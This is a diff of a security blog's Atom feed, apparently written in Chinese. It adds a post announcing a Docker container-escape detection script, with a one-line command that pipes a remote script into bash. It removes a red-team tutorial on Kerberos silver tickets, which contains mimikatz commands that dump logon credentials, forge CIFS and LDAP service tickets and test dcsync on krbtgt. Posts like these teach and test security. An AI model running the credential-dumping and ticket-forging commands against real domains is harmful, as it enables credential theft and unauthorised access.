@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2022-03-08T08:19:12.101Z</updated>
+  <updated>2022-03-18T08:52:00.604Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,37 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【工具分享】一个检测容器逃逸的脚本</title>
+    <link href="https://www.teamssix.com/220318-164446.html"/>
+    <id>https://www.teamssix.com/220318-164446.html</id>
+    <published>2022-03-18T08:44:46.000Z</published>
+    <updated>2022-03-18T08:52:00.604Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>最近搞了个检测 Docker 容器逃逸的脚本，目前支持以下几种方法的检测：</p><ol><li>处于特权模式</li><li>挂载了 Docker Socket</li><li>挂载了 Procfs</li><li>挂载了宿主机根目录</li><li>开启了 Docker 远程 API 访问接口</li><li>CVE-2016-5195 DirtyCow 脏牛漏洞</li><li>CVE-2020-14386 </li><li>CVE-2022-0847 DirtyPipe</li></ol><p>项目地址：<a href="https://github.com/teamssix/container-escape-check">https://github.com/teamssix/container-escape-check</a></p><p>感觉还不错的师傅们可以点个小星星 🌟</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>在 Docker 容器中一键运行：</p><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;teamssix&#x2F;container-escape-check&#x2F;main&#x2F;container-escape-check.sh | bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者克隆项目到容器中运行：</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;teamssix&#x2F;container-escape-check.gitcd container-escape-checkchmod +x container-escape-check.sh.&#x2F;container-escape-check.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202203181518954.png"></p><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ul><li>这个脚本需要在 Docker 容器中运行</li><li>这里的检测方法大多是基于我自己的经验，可能会存在检测误检或者漏检的情况，如果您发现了这种情况，欢迎提 Issue</li><li>由于有的逃逸方法需要根据目标 Docker 的版本去判断，这里我暂时还没想到从容器内部获取 Docker 版本的方法，因此脚本暂时还不支持这块儿的检测。</li></ul><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;最近搞了个检测 Docker 容器逃逸的脚本，目前支持以下几种方法的检测：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;处于特权模式&lt;/li&gt;
+&lt;li&gt;挂载了</summary>
+      
+    
+    
+    
+    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
+    
+    
+    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="容器" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8/"/>
+    
+    <category term="容器逃逸" scheme="https://www.teamssix.com/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
+    
+  </entry>
   
   <entry>
     <title>【漏洞复现】DirtyPipe CVE-2022-0847 Linux 内核提权漏洞复现</title>
@@ -528,36 +559,6 @@
     <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;常见的跨域攻击方法有以下几种：&lt;/p&gt;
 &lt;p&gt;i、利用常规的渗透方法，比如 Web 漏洞&lt;/p&gt;
 &lt;p&gt;ii、利用已知散列值</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】29、白银票据</title>
-    <link href="https://www.teamssix.com/211009-145524.html"/>
-    <id>https://www.teamssix.com/211009-145524.html</id>
-    <published>2021-10-09T06:55:24.000Z</published>
-    <updated>2021-11-22T08:59:49.773Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p><blockquote><p>Kerberos 协议详解：<a href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p></blockquote><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p><p>白银票据与黄金票据的区别：</p><p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p><p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p><p>想利用白银票据需要先知道以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p><pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 mimikatz 生成伪造的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png"></p><p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p><h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091403286.png"></p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a></p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></p><p>原文链接：</p><p><a href="https://teamssix.com/211009-145524.html">https://teamssix.com/211009-145524.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p</summary>
       
     
     
